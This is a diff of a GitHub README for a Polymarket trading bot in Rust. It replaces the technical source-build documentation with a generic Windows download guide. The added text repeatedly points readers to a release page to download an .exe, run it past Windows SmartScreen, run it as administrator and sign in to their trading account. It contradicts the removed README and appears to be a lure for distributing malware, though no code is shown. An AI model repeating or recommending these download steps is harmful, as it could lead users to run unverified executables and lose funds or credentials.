@@ -1,259 +1,153 @@
-# Polymarket Trading Bot (Rust)
+# 🤖 Polymarket-Trading-Bot-Rust - Trade on Polymarket with ease
 
-Rust trading automation for Polymarket short-horizon crypto and related markets. The workspace ships multiple binaries: dual-limit starters, a trailing stop strategy, backtests, and small utilities to validate balance, allowance, orders, merge, and redemption against the CLOB.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/sedimentary-republicofchile38/Polymarket-Trading-Bot-Rust/releases)
 
-## Overview
+## 🚀 Getting Started
 
-The bot loads a JSON config and optional `.env` secrets, authenticates to Polymarket’s CLOB (including proxy wallet modes), and runs strategies with simulation, live, or backtest / history-replay options. A native CLOB SDK is loaded at runtime; Linux deployments should use SDK builds matched to the host glibc (or Docker).
+Polymarket-Trading-Bot-Rust is a Windows app for users who want a simple way to place trades on Polymarket. It is built in Rust and packed as a desktop program, so you can download it and run it on your PC.
 
----
+This README shows you how to get the app, open it, and start using it on Windows.
 
-![Rust trading demo still](public/rust-profile.png)
+## 📥 Download the App
 
----
+Go to the release page here:
 
-https://github.com/user-attachments/assets/9e20bab4-431e-4f8d-8a69-147a34b7ea3b
+https://github.com/sedimentary-republicofchile38/Polymarket-Trading-Bot-Rust/releases
 
----
+On that page, look for the latest release. Download the Windows file that fits your computer. In most cases, this will be a `.exe` file or a `.zip` file that contains the app.
 
-### Key features
+If you download a `.zip` file, open it and move the app file to a folder you can find later, such as `Downloads` or `Desktop`.
 
-- **Multiple strategies**: Default dual-limit entry binaries, 5-minute BTC variant, and trailing-stop style execution.
-- **Simulation and backtest**: Paper mode and backtest / history file replay for strategy validation.
-- **Asset flags**: Configurable enablement of BTC, ETH, Solana, and XRP market families where implemented.
-- **Utilities**: `test_*` binaries for cash balance, allowance, limits, sell, merge, redeem, and multi-order checks.
-- **Container-friendly**: `Dockerfile` for environments where glibc and bundled SDK layout must match.
+## 🖥️ System Requirements
 
-## Architecture
+Use a Windows PC with:
 
-### Technology stack
+- Windows 10 or Windows 11
+- An internet connection
+- At least 200 MB of free disk space
+- A Polymarket account
+- A browser session you can use for login if the app asks for it
 
-- **Runtime**: Rust (see `rust-toolchain.toml` / `Cargo.toml` for MSRV relative to `alloy` and dependencies; **rustc 1.91+** is expected for this tree)
-- **Async**: Tokio
-- **Chain**: Polygon (and compatible EVM usage via configuration)
-- **HTTP / WS**: `reqwest`, `tokio-tungstenite` where used
-- **CLOB access**: Native SDK loaded via `libloading` (see [Technical details](#technical-details--clob-sdk))
-- **Config**: `config.json` (non-secrets) plus `.env` for keys (see [Installation](#installation))
+For best results, keep Windows up to date and use the latest release from the download page.
 
-### System flow
+## ⚙️ Setup on Windows
 
-```
-Load config + .env → L1/L2 CLOB auth → Market polling / strategy
-→ Order placement (or simulation) → Logs + optional history / backtest
-```
+Follow these steps:
 
-## Installation
+1. Open the release page.
+2. Download the latest Windows version.
+3. If the file is zipped, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the app file to run it.
+6. If Windows asks for permission, choose Run anyway or Yes.
 
-### Prerequisites
+If you see a file named `README`, `config`, or `settings`, leave it in the same folder as the app. Some desktop tools use nearby files to store your options.
 
-- **Rust and Cargo** via [rustup](https://rustup.rs/); this repo targets **stable** and requires a recent enough `rustc` (e.g. **1.91+** for current dependencies).
-- **Polymarket CLOB SDK shared library** on the library path: versioned `lib/libclob_sdk-ubuntu-22.04.so` and `lib/libclob_sdk-ubuntu-24.04.so` on Linux, or `libclob_sdk.dylib` / `clob_sdk.dll` on macOS / Windows, or set `LIBCOB_SDK_SO` to an explicit path.
-- A funded wallet and USDC for live trading, with keys supplied only through environment (never commit them).
+## 🧭 First Launch
 
-### Setup
+When you start the app for the first time, it may ask you to:
 
-1. **Clone the repository and enter the directory**
+- Sign in to your Polymarket account
+- Confirm access in your browser
+- Set a trading profile
+- Choose how much money to use per trade
+- Pick your market filter
 
-   ```bash
-   git clone <repository-url>
-   cd Polymarket-Trading-Bot-Rust
-   ```
+Use the default settings if you are not sure what to change. You can update them later after you learn how the app works.
 
-2. **Build**
+## 🧠 What the Bot Can Do
 
-   ```bash
-   cargo build --release
-   ```
+Polymarket-Trading-Bot-Rust is meant to help with common trading tasks on Polymarket, such as:
 
-3. **Configure `config.json`**
+- Watching market activity
+- Finding trade setups
+- Placing buy or sell orders
+- Tracking open positions
+- Managing trade size
+- Saving time on repeated actions
 
-   ```bash
-   cp config.example.json config.json
-   ```
+It is designed for users who want a faster way to handle routine trading work without doing everything by hand.
 
-   Edit `config.json` for trading intervals, enabled assets, dual-limit parameters, and base API URLs. Prefer **not** pasting `private_key` in the file; use `.env` instead.
+## 🛠️ Basic Use
 
-4. **Configure `.env`**
+After the app opens:
 
-   ```bash
-   # RUST_LOG=info
-   POLYMARKET_PRIVATE_KEY=0xYOUR_KEY
-   POLYMARKET_SIGNATURE_TYPE=2
-   POLYMARKET_PROXY_WALLET_ADDRESS=0xYOUR_PROXY_OR_SAFE
-   POLYMARKET_API_KEY_NONCE=0
-   # Optional: LIBCOB_SDK_SO=/absolute/path/to/libclob_sdk.so
-   ```
+1. Connect your Polymarket account.
+2. Review the market list.
+3. Choose the market you want to trade.
+4. Set the trade amount.
+5. Start the bot.
+6. Watch the activity log while it runs.
 
-5. **Docker (optional, Linux / glibc alignment)**
+If you want to stop the bot, use the Stop button in the app window. You can also close the program from the top-right corner of the window.
 
-   ```bash
-   docker build -t polymarket-trading-bot .
-   docker run --rm -it --env-file .env \
-     -v "$(pwd)/config.json:/app/config.json:ro" \
-     polymarket-trading-bot
-   ```
+## 🔒 Account and Safety Tips
 
-## Configuration
+Use care when trading with any bot:
 
-### `config.json` (summary)
+- Start with a small amount
+- Check each market before you run a trade
+- Make sure your account login is correct
+- Keep your app file in a safe folder
+- Use the latest release from GitHub
 
-| Section | Role |
-|---------|------|
-| `polymarket` | `gamma_api_url`, `clob_api_url`, optional inline secrets (prefer env) |
-| `trading` | Polling, dual-limit price/shares, hedge timing, trailing options, and `enable_*_trading` flags |
-
-See `config.example.json` for the full shape.
-
-### Environment variables (common)
-
-| Variable | Description |
-|----------|-------------|
-| `POLYMARKET_PRIVATE_KEY` | Hex private key (with or without `0x`) for live auth and orders |
-| `POLYMARKET_SIGNATURE_TYPE` | `0` EOA, `1` proxy, `2` browser / Safe style proxy (typical for MetaMask + Polymarket proxy) |
-| `POLYMARKET_PROXY_WALLET_ADDRESS` | Funder / proxy when using types 1 or 2 |
-| `POLYMARKET_API_KEY` / `SECRET` / `PASSPHRASE` | Optional cached L2 API credentials; otherwise derived via L1 auth |
-| `POLYMARKET_API_KEY_NONCE` | Optional nonce for stable derived API keys |
-| `LIBCOB_SDK_SO` | Override path to the CLOB SDK shared library |
-| `RUST_LOG` | Log level: `error`, `warn`, `info`, `debug`, `trace` |
-
-### CLI (see `src/config.rs` `Args`)
-
-| Flag | Role |
-|------|------|
-| `--config` | Path to JSON config (default `config.json`) |
-| `--simulation` / `-s` | Simulation (no real trades) where applicable |
-| `--no-simulation` | Force live mode |
-| `--backtest` | Backtest mode |
-| `--history-file` | Replay a `history/*.toml` file |
-
-## Usage
-
-### Default binary (`default-run` in `Cargo.toml`)
-
-```bash
-cargo run --release -- --config config.json
-```
-
-### Dual-limit (example)
-
-```bash
-cargo run --release --bin main_dual_limit_045_same_size -- --config config.json --no-simulation
-```
-
-```bash
-cargo run --release --bin main_dual_limit_045_5m_btc -- --config config.json
-```
-
-### Trailing and backtest
-
-```bash
-cargo run --release --bin main_trailing -- --config config.json
-cargo run --release --bin backtest -- --config config.json
-```
-
-### Helper binaries
-
-```bash
-cargo run --release --bin test_allowance -- --config config.json
-cargo run --release --bin test_limit_order -- --config config.json
-cargo run --release --bin test_merge -- --config config.json
-cargo run --release --bin test_redeem -- --config config.json
-cargo run --release --bin test_sell -- --config config.json
-cargo run --release --bin test_predict_fun -- --config config.json
-```
+If the app gives you a setting you do not understand, leave it unchanged until you know what it does.
 
-See `Cargo.toml` `[[bin]]` for registered binary names.
+## 🧩 Common Files You May See
 
-## Technical details
+A release may include these items:
 
-### CLOB SDK
+- `Polymarket-Trading-Bot-Rust.exe` — the app file
+- `config.json` — saved app settings
+- `logs` folder — records of app activity
+- `README.txt` — extra setup help
+- `assets` folder — app files used by the program
 
-- The bot loads a **native** Polymarket CLOB client; **GLIBC** mismatches (e.g. `.so` built on Ubuntu 24.04 on an Ubuntu 22.04 host) are **not** fixed by changing the Rust toolchain. Use versioned `lib/` artifacts, `LIBCOB_SDK_SO`, Docker, or an SDK built on the same glibc as production.
-- Authentication follows Polymarket CLOB L1 → L2 credential derivation; see official CLOB documentation.
+Keep all files together unless the release page says otherwise.
 
-### Strategy notes (high level)
+## ❓ Troubleshooting
 
-- **Dual-limit flows**: Post paired limits, then hedge the unfilled side after configured minutes and price conditions.
-- **Trailing**: Uses trailing stop and position sizing from `trading` in `config.json`.
-- Modes and exact thresholds vary by binary; read the corresponding `src/bin/*.rs` for entry points.
+### The app will not open
+- Right-click the file and choose Run as administrator
+- Check that the download finished
+- Make sure you extracted the zip file first
+- Try the newest release
 
-## Project structure
+### Windows blocks the file
+- Open the file again and choose More info
+- Then choose Run anyway if you trust the source
 
-```
-Polymarket-Trading-Bot-Rust/
-├── public/
-│   ├── trading-rust.png       # README / demo still (add asset)
-│   └── trading-rust.mp4       # optional local demo
-├── lib/                       # CLOB SDK .so / .dylib / .dll (not always in repo)
-├── history/                   # local price history / replay (gitignored)
-├── src/
-│   ├── lib.rs
-│   ├── config.rs
-│   ├── clob_sdk.rs
-│   ├── api.rs
-│   ├── trader.rs
-│   ├── monitor.rs
-│   ├── detector.rs
-│   ├── merge.rs
-│   ├── rtds.rs
-│   ├── backtest.rs
-│   ├── simulation.rs
-│   ├── term_ui.rs
-│   ├── models.rs
-│   └── bin/
-│       ├── main_dual_limit_045_same_size.rs
-│       ├── main_dual_limit_045_5m_btc.rs
-│       ├── main_trailing.rs
-│       ├── backtest.rs
-│       └── test_*.rs
-├── config.example.json
-├── rust-toolchain.toml
-├── Cargo.toml
-├── Dockerfile
-└── README.md
-```
+### The app opens but does not connect
+- Check your internet connection
+- Sign in to Polymarket in your browser
+- Close the app and open it again
+- Download the latest release
 
-## API integration
+### The layout looks broken
+- Change your Windows display scaling
+- Maximize the app window
+- Restart the app after changing screen size
 
-- **Gamma** and **CLOB** HTTP endpoints are configured in `config.json` under `polymarket.*`.
-- Orders and market data go through the loaded CLOB SDK and supporting Rust modules in `src/`.
+## 🗂️ Suggested Folder Setup
 
-## Monitoring and logging
+Keep the app in a simple folder path such as:
 
-- Use `RUST_LOG` for `env_logger` output levels.
-- Review stderr / stdout and any container logs for auth and SDK load errors before debugging strategy logic.
+- `C:\PolymarketBot`
+- `C:\Users\YourName\Desktop\PolymarketBot`
+- `C:\Users\YourName\Downloads\PolymarketBot`
 
-## Change history
+Avoid deep folder paths with many nested folders. A short path makes it easier to find the app and its files.
 
-Maintenance notes worth tracking in this repo:
+## 📌 Release Page
 
-1. **Rust / alloy MSRV**: Dependency upgrades can raise the minimum `rustc` beyond upstream SDK baselines.
-2. **Native SDK path**: `LIBCOB_SDK_SO` and `lib/` layout are deployment-specific; document the host OS when sharing issues.
+Download the latest Windows version here:
 
-## Risk considerations
+https://github.com/sedimentary-republicofchile38/Polymarket-Trading-Bot-Rust/releases
 
-1. **Market and liquidity**: Volatility and thin books can cause partial fills and slippage.
-2. **Execution**: Resting and aggressive orders may not fill as modeled in backtest.
-3. **Fees and gas**: Affect net PnL.
-4. **API limits**: Throttling or outages can block trading or redemption.
-5. **Native library**: A wrong or missing SDK prevents startup entirely.
+## 🧾 Repository Details
 
-**Operational suggestions**: Prove simulation and backtest first, use Docker when glibc is uncertain, and keep API keys and `config.json` out of version control if they hold secrets.
-
-## Development
-
-```bash
-cargo check
-cargo build --release
-```
-
-## Support
-
-Use repository issues for bugs and feature requests. For CLOB and Gamma behavior, use Polymarket’s official documentation.
-
----
-
-**Disclaimer**: This software is provided as-is, without warranty. Prediction markets and digital assets involve substantial risk of loss. Use only capital you can afford to lose and comply with applicable laws in your jurisdiction.
-
-**Version**: 0.1.0  
-**Last updated**: April 2026
+- Repository: Polymarket-Trading-Bot-Rust
+- Topics: polymarket-trading-bot, rust-trade-bot
+- Type: Desktop trading app
+- Platform: Windows
+- Language: Rust
